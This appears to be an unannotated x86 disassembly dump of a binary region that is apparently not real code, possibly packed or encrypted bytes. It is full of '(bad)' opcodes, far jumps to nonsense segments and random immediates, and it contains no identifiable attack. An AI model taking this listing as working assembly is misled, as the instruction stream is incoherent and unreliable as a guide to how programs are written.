  41e807:	mov    ebx,0x9880cecc
  41e80c:	lods   eax,DWORD PTR ds:[esi]
  41e80d:	inc    esp
  41e80e:	(bad)  
  41e80f:	mov    BYTE PTR [eax],dh
  41e811:	arpl   WORD PTR [ecx+0x3bad2425],bx
  41e817:	or     al,0x57
  41e819:	movaps xmm0,XMMWORD PTR [edx]
  41e81c:	out    dx,al
  41e81d:	sub    BYTE PTR [edi+0x70b953e4],cl
  41e823:	repnz (bad) 
  41e825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e826:	jl     0x41e854
  41e828:	aaa    
  41e829:	shl    ebp,cl
  41e82b:	mov    BYTE PTR [eax-0xb],dl
  41e82e:	cmp    eax,0x260043bc
  41e833:	inc    ebp
  41e834:	xchg   ebp,eax
  41e835:	inc    edx
  41e836:	(bad)  
  41e837:	jle    0x41e7f4
  41e839:	push   edi
  41e83a:	add    eax,0x6d8179dc
  41e83f:	sub    edi,DWORD PTR ss:[ebx+0x2ececb18]
  41e846:	jns    0x41e80c
  41e848:	mov    dl,0xbe
  41e84a:	stos   DWORD PTR es:[edi],eax
  41e84b:	xchg   DWORD PTR [ebx],ebx
  41e84d:	fsub   QWORD PTR [edi-0x6260e21f]
  41e853:	loopne 0x41e83c
  41e855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e856:	push   ss
  41e857:	dec    ebx
  41e858:	pushf  
  41e859:	imul   esi,DWORD PTR [esi+0x73],0x947f24f8
  41e860:	aam    0x8
  41e862:	fimul  DWORD PTR [esi-0x33a14a89]
  41e868:	daa    
  41e869:	add    edx,DWORD PTR [edi+0x4d]
  41e86c:	ret    0x818a
  41e86f:	push   ebx
  41e870:	mov    dl,0xd3
  41e872:	int3   
  41e873:	inc    esi
  41e874:	inc    eax
  41e875:	mov    esp,0x5b43f748
  41e87a:	mov    ebp,0xe5dc4787
  41e87f:	and    al,0xfb
  41e881:	int    0x3e
  41e883:	sub    ch,al
  41e885:	test   eax,0x730c3ac5
  41e88a:	mov    dl,0x89
  41e88c:	dec    ebx
  41e88d:	cmp    esi,esp
  41e88f:	inc    ecx
  41e890:	jae    0x41e884
  41e892:	cmp    eax,0x68bae55a
  41e897:	in     al,0x7e
  41e899:	outs   dx,BYTE PTR ds:[esi]
  41e89a:	push   cs
  41e89b:	(bad)  
  41e89c:	or     ah,dl
  41e89e:	scas   al,BYTE PTR es:[edi]
  41e89f:	cmc    
  41e8a0:	daa    
  41e8a1:	push   edi
  41e8a2:	(bad)  
  41e8a3:	and    eax,0xeceb087d
  41e8a8:	popa   
  41e8a9:	ja     0x41e895
  41e8ab:	add    eax,0xf968a0e0
  41e8b0:	dec    edx
  41e8b1:	xchg   DWORD PTR [edx-0x3e966b1],eax
  41e8b7:	ja     0x41e912
  41e8b9:	das    
  41e8ba:	and    al,0x84
  41e8bc:	sbb    eax,0x78016d5a
  41e8c1:	std    
  41e8c2:	test   eax,0x38d163ce
  41e8c7:	xchg   ebx,eax
  41e8c8:	mov    eax,0x1a261e20
  41e8cd:	mov    WORD PTR [edx-0x31],gs
  41e8d0:	shr    BYTE PTR [ecx+0x5d],0x29
  41e8d4:	das    
  41e8d5:	cmp    bh,dl
  41e8d7:	push   cs
  41e8d8:	mov    ah,0x79
  41e8da:	div    BYTE PTR [ebp+0x55]
  41e8dd:	xchg   ebx,eax
  41e8de:	lea    edi,ds:0x4896ce06
  41e8e4:	adc    BYTE PTR [ebx+0x797fa72e],al
  41e8ea:	stc    
  41e8eb:	add    BYTE PTR [edi-0x2707b786],bh
  41e8f1:	mov    ah,0x5
  41e8f3:	adc    BYTE PTR [esi],bl
  41e8f5:	cmp    al,bl
  41e8f7:	inc    ecx
  41e8f8:	pop    DWORD PTR [esi+0x52b3ed7b]
  41e8fe:	jecxz  0x41e893
  41e900:	or     ebx,esi
  41e902:	aaa    
  41e903:	jbe    0x41e8d6
  41e905:	daa    
  41e906:	and    ah,BYTE PTR [edi-0x6d]
  41e909:	fiadd  DWORD PTR [esi+edx*2-0x37cafa91]
  41e910:	add    DWORD PTR [edx+0x7e],ecx
  41e913:	test   eax,0x4c18b65d
  41e918:	int3   
  41e919:	rol    DWORD PTR [eax+edx*2-0x250328f],1
  41e920:	ins    BYTE PTR es:[edi],dx
  41e921:	fiadd  WORD PTR [edx+0x4df1c404]
  41e927:	add    bh,BYTE PTR [ebp+0x4d]
  41e92a:	jno    0x41e97f
  41e92c:	ficomp WORD PTR [esi]
  41e92e:	adc    bl,ch
  41e930:	adc    ebx,edx
  41e932:	iret   
  41e933:	mov    ebx,?
  41e935:	leave  
  41e936:	or     dl,BYTE PTR [esi]
  41e938:	cmp    ebx,DWORD PTR [edx+0x27]
  41e93b:	in     eax,0x11
  41e93d:	dec    esi
  41e93e:	and    BYTE PTR [ecx+0x68],dl
  41e941:	dec    ecx
  41e942:	mov    ds:0x7d56433c,eax
  41e947:	mov    ah,0x92
  41e949:	fstp   TBYTE PTR [esi-0x38]
  41e94c:	in     eax,dx
  41e94d:	(bad)  
  41e94e:	retf   0xa6ea
  41e951:	mov    al,0xb6
  41e953:	inc    ebx
  41e954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e955:	scas   eax,DWORD PTR es:[edi]
  41e956:	push   edx
  41e957:	ins    DWORD PTR es:[edi],dx
  41e958:	sub    bl,BYTE PTR [ebx]
  41e95a:	inc    edx
  41e95b:	dec    esi
  41e95c:	dec    esi
  41e95d:	imul   ebx,DWORD PTR es:[eax],0xafcec985
  41e964:	pushf  
  41e965:	lods   eax,DWORD PTR ds:[esi]
  41e966:	das    
  41e967:	(bad)  
  41e968:	sar    DWORD PTR [ecx],1
  41e96a:	stos   BYTE PTR es:[edi],al
  41e96b:	call   0xbdc2:0xb9f243b3
  41e972:	test   eax,0xefdaa390
  41e977:	fsub   QWORD PTR [ebx-0x49b0217d]
  41e97d:	std    
  41e97e:	cwde   
  41e97f:	dec    eax
  41e980:	jae    0x41e914
  41e982:	nop
  41e983:	jecxz  0x41e9d6
  41e985:	mov    dh,0xbc
  41e987:	xlat   BYTE PTR ds:[ebx]
  41e988:	mov    edi,0x45bf8cd9
  41e98d:	outs   dx,DWORD PTR ds:[esi]
  41e98e:	or     BYTE PTR [ecx-0x6d],bh
  41e991:	and    BYTE PTR [edi-0x23c9ed90],dh
  41e997:	int    0x1c
  41e999:	stos   DWORD PTR es:[edi],eax
  41e99a:	rcr    ecx,cl
  41e99c:	outs   dx,DWORD PTR ds:[esi]
  41e99d:	pop    es
  41e99e:	and    al,0xf1
  41e9a0:	leave  
  41e9a1:	imul   esp,DWORD PTR [esp+esi*2],0xffffffa9
  41e9a5:	jnp    0x41e999
  41e9a7:	dec    edx
  41e9a8:	popf   
  41e9a9:	xor    al,0x55
  41e9ab:	push   ebx
  41e9ac:	cmp    eax,0xa8a1be23
  41e9b1:	ret    
  41e9b2:	les    ebp,FWORD PTR [eax]
  41e9b4:	outs   dx,BYTE PTR ds:[esi]
  41e9b5:	stc    
  41e9b6:	nop
  41e9b7:	(bad)  [esi+0x66]
  41e9ba:	rcl    BYTE PTR [ecx-0x7eba57f9],0x96
  41e9c1:	xor    eax,0x37996721
  41e9c6:	lea    ecx,[eax+0x2e]
  41e9c9:	pop    esi
  41e9ca:	sub    al,0x9
  41e9cc:	xchg   BYTE PTR [eax+0x5],ah
  41e9cf:	push   0x47
  41e9d1:	xchg   ebp,ebx
  41e9d3:	push   ds
  41e9d4:	adc    DWORD PTR [edx],ebp
  41e9d6:	mov    bl,BYTE PTR [eax+eiz*1+0x539fafa4]
  41e9dd:	and    al,BYTE PTR [esp+edx*4+0x18d946ef]
  41e9e4:	jo     0x41e988
  41e9e6:	mov    eax,ds:0xe0f734d5
  41e9eb:	ins    BYTE PTR es:[edi],dx
  41e9ec:	stos   BYTE PTR es:[edi],al
  41e9ed:	(bad)  
  41e9ee:	lahf   
  41e9ef:	es loop 0x41e9cf
  41e9f2:	inc    ecx
  41e9f3:	jecxz  0x41e9e6
  41e9f5:	jnp    0x41ea32
  41e9f7:	out    0x8f,al
  41e9f9:	sub    al,0xd
  41e9fb:	popf   
  41e9fc:	jg     0x41ea71
  41e9fe:	and    esi,ebp
  41ea00:	sub    cl,BYTE PTR [esp+edi*4-0x748c5fdf]
  41ea07:	cdq    
  41ea08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea09:	pop    eax
  41ea0a:	xchg   esp,eax
  41ea0b:	dec    eax
  41ea0c:	lea    ecx,[edi+0x37718e68]
  41ea12:	hlt    
  41ea13:	or     DWORD PTR [edx],ecx
  41ea15:	test   eax,0xfce1ced3
  41ea1a:	mov    al,BYTE PTR [ebx]
  41ea1c:	int3   
  41ea1d:	scas   eax,DWORD PTR es:[edi]
  41ea1e:	jg     0x41ea7c
  41ea20:	lock lods eax,DWORD PTR ds:[esi]
  41ea22:	push   ebp
  41ea23:	(bad)  [edi]
  41ea25:	dec    esp
  41ea26:	retf   
  41ea27:	mov    bl,0x14
  41ea29:	pop    ebx
  41ea2a:	jno    0x41eaa2
  41ea2c:	enter  0xe02,0xa8
  41ea30:	jo     0x41ea7a
  41ea32:	iret   
  41ea33:	inc    ebp
  41ea34:	bound  esi,QWORD PTR [ebp+0x74]
  41ea37:	test   ebx,esp
  41ea39:	jae    0x41ea14
  41ea3b:	bound  ebp,QWORD PTR [ecx+0x27]
  41ea3e:	push   ebx
  41ea3f:	retf   0xe2c2
  41ea42:	in     al,dx
  41ea43:	xor    dl,cl
  41ea45:	or     ebp,DWORD PTR [edi+0x55568363]
  41ea4b:	nop
  41ea4c:	mov    al,ds:0x9ae81971
  41ea51:	jle    0x41e9e6
  41ea53:	mov    dl,0xd1
  41ea55:	or     eax,0xec2ab0d4
  41ea5a:	jmp    0x41ea64
  41ea5c:	or     bh,al
  41ea5e:	sti    
  41ea5f:	jne    0x41ea82
  41ea61:	call   0xb81e:0x1a93456c
  41ea68:	retf   0xc0ed
  41ea6b:	cmp    edx,DWORD PTR [ebp+0x4f]
  41ea6e:	mov    eax,ds:0x417399ab
  41ea73:	mov    esp,0xd625a572
  41ea78:	mov    esi,cs
  41ea7a:	mov    dh,0x7f
  41ea7c:	shl    DWORD PTR ds:0x853c17f1,cl
  41ea82:	mov    ds:0x2baf6865,al
  41ea87:	xchg   ebx,eax
  41ea88:	push   0x305de0cf
  41ea8d:	mov    dh,0xe
  41ea8f:	out    0xdb,al
  41ea91:	stos   DWORD PTR es:[edi],eax
  41ea92:	jle    0x41ea46
  41ea94:	mov    cl,0xa7
  41ea96:	sbb    DWORD PTR [eax-0x624d0dd2],0x8db707a1
  41eaa0:	mov    dh,0xab
  41eaa2:	mov    edx,0xbc737a7
  41eaa7:	fwait
  41eaa8:	sahf   
  41eaa9:	xlat   BYTE PTR ds:[ebx]
  41eaaa:	xor    eax,0x770eb2a1
  41eaaf:	mov    ah,al
  41eab1:	xor    eax,0xefbe7fc1
  41eab6:	add    cl,cl
  41eab8:	jne    0x41ea5a
  41eaba:	out    dx,eax
  41eabb:	cld    
  41eabc:	test   BYTE PTR [ebx],dl
  41eabe:	adc    eax,0x7f3ac88c
  41eac3:	mov    DWORD PTR [esi-0x2c],ebx
  41eac6:	add    DWORD PTR [esi],0x5b
  41eac9:	(bad)  [eax]
  41eacb:	mov    eax,ds:0xb73aaa3c
  41ead0:	jge    0x41eab1
  41ead2:	inc    ebp
  41ead3:	xor    BYTE PTR [eax],dl
  41ead5:	xor    BYTE PTR [ebp-0x5eea54a3],ch
  41eadb:	stos   BYTE PTR es:[edi],al
  41eadc:	daa    
  41eadd:	aas    
  41eade:	ja     0x41eb01
  41eae0:	or     eax,DWORD PTR [ebx+ebp*2]
  41eae3:	mov    BYTE PTR [ebp+0x29f1f15a],al
  41eae9:	jne    0x41eaa1
  41eaeb:	fimul  DWORD PTR [esi+0x1393fbb1]
  41eaf1:	dec    esp
  41eaf2:	int    0x7a
  41eaf4:	fcom   QWORD PTR [edi+0x4c]
  41eaf7:	outs   dx,BYTE PTR ds:[esi]
  41eaf8:	outs   dx,DWORD PTR fs:[esi]
  41eafa:	inc    ebp
  41eafb:	shl    DWORD PTR [edx-0x16c1594],0xb5
  41eb02:	mov    bh,0x8c
  41eb04:	push   0x4a
  41eb06:	shr    BYTE PTR [ebx+esi*2],cl
  41eb09:	or     BYTE PTR [edi-0xbf44f02],ah
  41eb0f:	xchg   edx,eax
  41eb10:	scas   eax,DWORD PTR es:[edi]
  41eb11:	jne    0x41eae7
  41eb13:	jmp    0x8297:0x3b620e55
  41eb1a:	sub    al,0xa1
  41eb1c:	test   BYTE PTR [eax-0x2ac0a8d4],cl
  41eb22:	or     eax,DWORD PTR [ebx]
  41eb24:	add    BYTE PTR [ecx],dl
  41eb26:	jne    0x41eb4f
  41eb28:	(bad)  
  41eb29:	pop    esp
  41eb2a:	jb     0x41eaba
  41eb2c:	xchg   esi,eax
  41eb2d:	(bad)  
  41eb2e:	jbe    0x41eb26
  41eb30:	outs   dx,DWORD PTR ds:[esi]
  41eb31:	pop    esi
  41eb32:	les    ecx,FWORD PTR [esi+0x1f5a23fb]
  41eb38:	dec    ebx
  41eb39:	jae    0x41eb80
  41eb3b:	rcl    edi,0x96
  41eb3e:	das    
  41eb3f:	lock push edi
  41eb41:	loop   0x41eb3b
  41eb43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb44:	xor    dh,BYTE PTR [ebp+0xcda59a0]
  41eb4a:	call   0x6b20acc1
  41eb4f:	jl     0x41ebcb
  41eb51:	xchg   ecx,eax
  41eb52:	mov    ss,WORD PTR [ebx]
  41eb54:	fwait
  41eb55:	imul   ebp,DWORD PTR [esi-0x73],0x984db2a1
  41eb5c:	mov    ecx,DWORD PTR [esi-0x37]
  41eb5f:	pop    edx
  41eb60:	mov    ebp,0xab833da0
  41eb65:	int    0x8d
  41eb67:	mov    ss,WORD PTR [eax+0x30]
  41eb6a:	ret    0x1b1f
  41eb6d:	sbb    al,0x20
  41eb6f:	xchg   esi,eax
  41eb70:	ror    dh,cl
  41eb72:	mov    ds:0xf5ad7e81,al
  41eb77:	sti    
  41eb78:	cmp    esp,ecx
  41eb7a:	fsubr  QWORD PTR [edi]
  41eb7c:	ret    
  41eb7d:	jmp    0x41eb59
  41eb7f:	ret    
  41eb80:	xchg   edx,eax
  41eb81:	cmp    bl,bl
  41eb83:	ja     0x41ebdc
  41eb85:	repnz int3 
  41eb87:	mov    dl,BYTE PTR [ecx-0x68]
  41eb8a:	out    dx,al
  41eb8b:	in     al,dx
  41eb8c:	scas   eax,DWORD PTR es:[edi]
  41eb8d:	jae    0x41eb10
  41eb8f:	leave  
  41eb90:	xchg   ebp,esp
  41eb92:	iret   
  41eb93:	pop    eax
  41eb94:	call   DWORD PTR [eax-0x1941a0d5]
  41eb9a:	push   ebx
  41eb9b:	scas   al,BYTE PTR es:[edi]
  41eb9c:	pop    ss
  41eb9d:	clc    
  41eb9e:	ins    DWORD PTR es:[edi],dx
  41eb9f:	cmp    eax,0xa69d4c6
  41eba4:	aad    0x61
  41eba6:	mov    al,ds:0x93bc818f
  41ebab:	(bad)  
  41ebac:	jnp    0x41eb89
  41ebae:	jecxz  0x41ec19
  41ebb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebb1:	aas    
  41ebb2:	xchg   edi,eax
  41ebb3:	loop   0x41ebab
  41ebb5:	arpl   WORD PTR [ecx-0x59],bp
  41ebb8:	loopne 0x41eb40
  41ebba:	cli    
  41ebbb:	jo     0x41ebb9
  41ebbd:	xchg   esp,eax
  41ebbe:	dec    ecx
  41ebbf:	push   esi
  41ebc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc1:	das    
  41ebc2:	xchg   ecx,eax
  41ebc3:	add    cl,BYTE PTR [eax+0x2589240c]
  41ebc9:	xchg   ebp,eax
  41ebca:	fs inc esi
  41ebcc:	adc    DWORD PTR [ebp-0x6a],edx
  41ebcf:	push   cs
  41ebd0:	aam    0x71
  41ebd2:	mov    DWORD PTR [ebp-0x15aa5757],ecx
  41ebd8:	int3   
  41ebd9:	scas   eax,DWORD PTR es:[edi]
  41ebda:	mov    ds:0xc184b4b,al
  41ebdf:	push   esi
  41ebe0:	cmp    eax,0xf4b424b4
  41ebe5:	lahf   
  41ebe6:	sbb    ch,bh
  41ebe8:	test   esi,ebp
  41ebea:	ja     0x41ebbf
  41ebec:	and    BYTE PTR [edi+0x37d9667c],dh
  41ebf2:	jge    0x41eb91
  41ebf4:	push   esi
  41ebf5:	pop    ebx
  41ebf6:	adc    ebx,DWORD PTR [ebx+0x6e08c721]
  41ebfc:	inc    ebp
  41ebfd:	push   0xfffffffd
  41ebff:	mov    ds:0xdb4713ab,eax
  41ec04:	inc    esi
  41ec05:	ss int 0xf1
  41ec08:	lods   eax,DWORD PTR ds:[esi]
  41ec09:	dec    edx
  41ec0a:	or     al,0x25
  41ec0c:	dec    ecx
  41ec0d:	mov    dh,0xa3
  41ec0f:	(bad)  
  41ec10:	mov    bh,0x9b
  41ec12:	std    
  41ec13:	retf   0x52d
  41ec16:	sbb    BYTE PTR [esi+0x648c66e7],al
  41ec1c:	call   0x501f:0xa8804c79
  41ec23:	sub    eax,0xdaaf0e03
  41ec28:	hlt    
  41ec29:	setb   BYTE PTR [edi]
  41ec2c:	dec    ebx
  41ec2d:	ror    eax,1
  41ec2f:	test   al,0x47
  41ec31:	aam    0x5f
  41ec33:	lods   al,BYTE PTR ds:[esi]
  41ec34:	push   edx
  41ec35:	push   es
  41ec36:	(bad)  
  41ec37:	cdq    
  41ec38:	xchg   esi,eax
  41ec39:	xchg   ebx,eax
  41ec3a:	sbb    cl,bl
  41ec3c:	lods   eax,DWORD PTR ds:[esi]
  41ec3d:	icebp  
  41ec3e:	test   DWORD PTR [edx-0x56],0x1b5557d3
  41ec45:	aad    0x72
  41ec47:	cmp    edi,DWORD PTR ds:0x6614a687
  41ec4d:	popa   
  41ec4e:	fwait
  41ec4f:	xchg   edi,eax
  41ec50:	fidiv  DWORD PTR [eax-0x4d]
  41ec53:	pop    ebx
  41ec54:	inc    BYTE PTR ds:0x63f0317e
  41ec5a:	jge    0x41ec2e
  41ec5c:	adc    ebp,DWORD PTR [esi]
  41ec5e:	nop
  41ec5f:	fsubr  DWORD PTR [eax+eiz*1-0x172358e0]
  41ec66:	xor    al,0x34
  41ec68:	push   ebx
  41ec69:	std    
  41ec6a:	push   ecx
  41ec6b:	hlt    
  41ec6c:	push   0x1e
  41ec6e:	cdq    
  41ec6f:	mov    cl,0x98
  41ec71:	(bad)  
  41ec72:	pop    ebx
  41ec73:	dec    esp
  41ec74:	popa   
  41ec75:	xor    al,BYTE PTR [eax+0x3c2e070]
  41ec7b:	repz repz es in al,0xd0
  41ec80:	add    al,0xd
  41ec82:	pop    ecx
  41ec83:	gs adc al,0x51
  41ec86:	sub    DWORD PTR [edx],eax
  41ec88:	arpl   dx,di
  41ec8a:	mov    dh,0xc
  41ec8c:	mov    bh,0x8b
  41ec8e:	add    esp,DWORD PTR [edi+0x5285cd1b]
  41ec94:	mov    ch,0x4f
  41ec96:	mov    bl,0xcf
  41ec98:	inc    ebp
  41ec99:	shl    BYTE PTR fs:[edi+0xd],0x6d
  41ec9e:	xor    BYTE PTR [edx+0x70d05164],ch
  41eca4:	sbb    al,0x5d
  41eca6:	lods   al,BYTE PTR ds:[esi]
  41eca7:	jbe    0x41ec40
  41eca9:	cdq    
  41ecaa:	stos   BYTE PTR es:[edi],al
  41ecab:	mov    al,ds:0x42674b1a
  41ecb0:	mov    DWORD PTR [ebp-0x5b],0xe5685661
  41ecb7:	jmp    0x885:0x10730575
  41ecbe:	push   edx
  41ecbf:	add    DWORD PTR [edx-0x7ff151e0],0xe
  41ecc6:	inc    ebx
  41ecc7:	dec    eax
  41ecc8:	adc    BYTE PTR [ebx+0x37],al
  41eccb:	lahf   
  41eccc:	add    al,0x6
  41ecce:	fwait
  41eccf:	imul   eax,eax,0x7
  41ecd2:	test   cl,0x51
  41ecd5:	lods   eax,DWORD PTR ds:[esi]
  41ecd6:	(bad)  
  41ecd7:	into   
  41ecd8:	fdivr  st(4),st
  41ecda:	sbb    ebp,edx
  41ecdc:	or     eax,0x445bb39
  41ece1:	mov    ah,0x32
  41ece3:	in     eax,dx
  41ece4:	mov    bh,0x27
  41ece6:	xor    cl,BYTE PTR [esi+0x78223442]
  41ecec:	sbb    DWORD PTR [esp+ebp*1+0x12],edx
  41ecf0:	lahf   
  41ecf1:	sti    
  41ecf2:	xor    eax,0x14458427
  41ecf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecf8:	loopne 0x41eca6
  41ecfa:	push   eax
  41ecfb:	pop    esp
  41ecfc:	out    0x62,eax
  41ecfe:	pusha  
  41ecff:	iret   
  41ed00:	dec    edx
  41ed01:	in     eax,0xd1
  41ed03:	out    0x82,al
  41ed05:	dec    ebp
  41ed06:	and    BYTE PTR [edi+0x17d5d3f2],cl
  41ed0c:	rol    BYTE PTR [ebx],0xbc
  41ed0f:	xrelease mov BYTE PTR [eax+0x317f599a],cl
  41ed16:	push   edi
  41ed17:	pop    ebx
  41ed18:	sub    ecx,ebp
  41ed1a:	icebp  
  41ed1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed1c:	pop    edx
  41ed1d:	call   0xb87b:0xbfc0136c
  41ed24:	js     0x41ed1a
  41ed26:	mov    bh,0x5b
  41ed28:	in     al,0x5f
  41ed2a:	jp     0x41ed8a
  41ed2c:	adc    DWORD PTR [edi+edi*4-0x5],ebx
  41ed30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed31:	test   BYTE PTR [esi],cl
  41ed33:	adc    eax,0x12c94d4a
  41ed38:	repnz fmulp st(0),st
  41ed3b:	push   edi
  41ed3c:	mov    ds,WORD PTR [ebp+0xa1761c6]
  41ed42:	clc    
  41ed43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed44:	daa    
  41ed45:	sahf   
  41ed46:	(bad)  
  41ed47:	int    0xa3
  41ed49:	inc    eax
  41ed4a:	and    DWORD PTR [eax+0x69dfba69],0x1d
  41ed51:	inc    esp
  41ed52:	ins    DWORD PTR es:[edi],dx
  41ed53:	das    
  41ed54:	mov    ah,0x76
  41ed56:	fmul   DWORD PTR [esi-0x51]
  41ed59:	or     BYTE PTR [eax+0xf532256],0x17
  41ed60:	pop    ebx
  41ed61:	dec    ebx
  41ed62:	out    dx,eax
  41ed63:	xchg   BYTE PTR [ecx+0x1e12343f],dh
  41ed69:	test   DWORD PTR [eax-0x1b],esp
  41ed6c:	sub    al,0xba
  41ed6e:	fxch   st(7)
  41ed70:	jle    0x41ed94
  41ed72:	xchg   bx,ax
  41ed74:	and    bl,al
  41ed76:	pop    es
  41ed77:	js     0x41edba
  41ed79:	in     eax,dx
  41ed7a:	push   esi
  41ed7b:	je     0x41ed61
  41ed7d:	aas    
  41ed7e:	ret    
  41ed7f:	add    al,0xb1
  41ed81:	mov    cl,0x63
  41ed83:	dec    esp
  41ed84:	xor    eax,0xc349618d
  41ed89:	add    al,0xbb
  41ed8b:	and    BYTE PTR [esi+0x288e4c94],0x47
  41ed92:	xchg   esp,eax
  41ed93:	mov    eax,0xe123f17e
  41ed98:	inc    ebp
  41ed99:	or     al,0x43
  41ed9b:	addr16 (bad) 
  41ed9d:	imul   edi,DWORD PTR [ebp+0x6e],0x72
  41eda1:	xor    BYTE PTR [edi+0x1d700221],dh
  41eda7:	cwde   
  41eda8:	jge    0x41edfb
  41edaa:	pop    ecx
  41edab:	aaa    
  41edac:	push   0xeb3bbe73
  41edb1:	jmp    0xa6c99bef
  41edb6:	in     eax,dx
  41edb7:	fdivr  st(2),st
  41edb9:	push   ds
  41edba:	(bad)  
  41edbc:	mov    esp,0xbf3b559c
  41edc1:	xchg   edx,eax
  41edc2:	inc    esp
  41edc3:	add    BYTE PTR ds:0xc59516b2,ch
  41edc9:	mov    ds:0x6055651f,eax
  41edce:	retf   0x44a7
  41edd1:	push   ebx
  41edd2:	mov    ds:0x41984ebd,eax
  41edd7:	push   edi
  41edd8:	adc    DWORD PTR [esi+ebp*1],ecx
  41eddb:	pop    es
  41eddc:	lahf   
  41eddd:	adc    bh,dh
  41eddf:	nop
  41ede0:	sti    
  41ede1:	add    eax,0x9c382cc8
  41ede6:	push   0x1e0acbca
  41edeb:	daa    
  41edec:	ret    
  41eded:	rcl    DWORD PTR [edi-0x5ef8410],cl
  41edf3:	mov    edi,ebp
  41edf5:	or     eax,ecx
  41edf7:	bswap  esp
  41edf9:	push   0x395db8d3
  41edfe:	add    eax,0xa3e3c8b3
  41ee03:	fld    QWORD PTR [ebx+ebx*2+0x35]
  41ee07:	cmp    DWORD PTR [esi],edx
  41ee09:	xchg   ebx,eax
  41ee0a:	lea    esp,[eax-0x58]
  41ee0d:	adc    dh,BYTE PTR [eax+edi*1]
  41ee10:	cmp    esp,ebx
  41ee12:	adc    edx,DWORD PTR [ebx]
  41ee14:	dec    ebp
  41ee15:	std    
  41ee16:	sbb    al,0xd2
  41ee18:	rol    DWORD PTR [ecx+0x5227da0f],cl
  41ee1e:	push   ds
  41ee1f:	fsub   QWORD PTR [ebx+0x20]
  41ee22:	xchg   edx,eax
  41ee23:	mov    ah,0x62
  41ee25:	mov    ebp,0x66bf20d9
  41ee2a:	ret    
  41ee2b:	cmc    
  41ee2c:	push   esp
  41ee2d:	pop    esp
  41ee2e:	adc    bh,BYTE PTR [eax-0x73f19e35]
  41ee34:	dec    edi
  41ee35:	xor    ch,ah
  41ee37:	call   0xc657:0xef0c647f
  41ee3e:	aad    0x49
  41ee40:	lea    ecx,[edx]
  41ee42:	push   ecx
  41ee43:	pop    esi
  41ee44:	outs   dx,BYTE PTR ds:[esi]
  41ee45:	or     edi,DWORD PTR [eax-0x7c]
  41ee48:	lea    edx,[esi]
  41ee4a:	pop    ebp
  41ee4b:	mov    ebp,DWORD PTR [edi]
  41ee4d:	and    al,0x84
  41ee4f:	data16 jo 0x41eebb
  41ee52:	dec    ecx
  41ee53:	mov    eax,ds:0x90de139d
  41ee58:	mov    esi,0x76c501fe
  41ee5d:	push   ebx
  41ee5e:	jo     0x41ee14
  41ee60:	jp     0x41ee4d
  41ee62:	xchg   ecx,eax
  41ee63:	adc    eax,0x71a66f1c
  41ee68:	jnp    0x41ee76
  41ee6a:	gs push ebp
  41ee6c:	scas   al,BYTE PTR es:[edi]
  41ee6d:	aam    0x4
  41ee6f:	adc    BYTE PTR [edx],bh
  41ee71:	jno    0x41eeb4
  41ee73:	and    BYTE PTR [edx+0x7bdd860d],al
  41ee79:	cmp    al,0xb4
  41ee7b:	dec    ebp
  41ee7c:	push   ss
  41ee7d:	mov    cl,0x79
  41ee7f:	sub    BYTE PTR [esi+edi*2],cl
  41ee82:	push   ecx
  41ee83:	out    0x60,al
  41ee85:	fsub   DWORD PTR [edx+0x3a]
  41ee88:	fwait
  41ee89:	jmp    0x5484473a
  41ee8e:	imul   edx,DWORD PTR [eax+0x2c229caf],0x675ebdae
  41ee98:	or     al,0x50
  41ee9a:	add    DWORD PTR [ebx],0xffffffaf
  41ee9d:	inc    ebp
  41ee9e:	mov    ds:0xbec48783,al
  41eea3:	mov    DWORD PTR [edi-0x2e159a61],ebp
  41eea9:	sbb    eax,0x964aeea8
  41eeae:	xor    esi,DWORD PTR [ebx-0x14]
  41eeb1:	in     al,dx
  41eeb2:	xor    BYTE PTR [edx-0x9e9ee48],bh
  41eeb8:	fidiv  WORD PTR ds:0x3c321d81
  41eebe:	xor    BYTE PTR [eax],0x3
  41eec1:	and    edx,DWORD PTR [edx]
  41eec3:	outs   dx,BYTE PTR ds:[esi]
  41eec4:	mov    bh,0x8
  41eec6:	mov    bl,0x2f
  41eec8:	cld    
  41eec9:	mov    bl,0xc0
  41eecb:	ror    BYTE PTR [edi],0x6d
  41eece:	mov    ah,0x94
  41eed0:	push   es
  41eed1:	das    
  41eed2:	fs cmp DWORD PTR es:[ebx-0x5],ebx
  41eed7:	xchg   ebx,eax
  41eed8:	fistp  DWORD PTR [esp+ebp*8-0x7d0e7a1a]
  41eedf:	and    DWORD PTR [ebx],ecx
  41eee1:	adc    al,0x55
  41eee3:	adc    esp,DWORD PTR [ebx-0x50027fcb]
  41eee9:	add    al,0x4e
  41eeeb:	(bad)  
  41eeec:	test   edx,edi
  41eeee:	cmp    al,0xdb
  41eef0:	(bad)  
  41eef1:	cmc    
  41eef2:	loopne 0x41eeda
  41eef4:	iret   
  41eef5:	xor    BYTE PTR [edi-0xfe26960],al
  41eefb:	dec    ebp
  41eefc:	les    ecx,FWORD PTR [edi+0x103bc8ad]
  41ef02:	test   BYTE PTR [ebp-0x43d1a138],al
  41ef08:	sti    
  41ef09:	(bad)  
  41ef0a:	xchg   esi,eax
  41ef0b:	and    BYTE PTR [edi-0x9560ff5],bl
  41ef11:	sub    DWORD PTR [eax-0x62],eax
  41ef14:	pop    esp
  41ef15:	xor    cl,BYTE PTR [edx-0x63]
  41ef18:	push   edi
  41ef19:	fwait
  41ef1a:	repnz mov ah,0x1f
  41ef1d:	push   0x703616af
  41ef22:	and    eax,0xcf78b8d0
  41ef27:	inc    esp
  41ef28:	inc    ecx
  41ef29:	test   al,0xc6
  41ef2b:	inc    edx
  41ef2c:	inc    ebp
  41ef2d:	aas    
  41ef2e:	hlt    
  41ef2f:	aam    0x83
  41ef31:	sub    eax,0x97939d9e
  41ef37:	sub    DWORD PTR [edi+0x8],ebp
  41ef3a:	adc    al,0x58
  41ef3c:	fsubr  st,st(4)
  41ef3e:	mov    cs,ebp
  41ef40:	ins    BYTE PTR es:[edi],dx
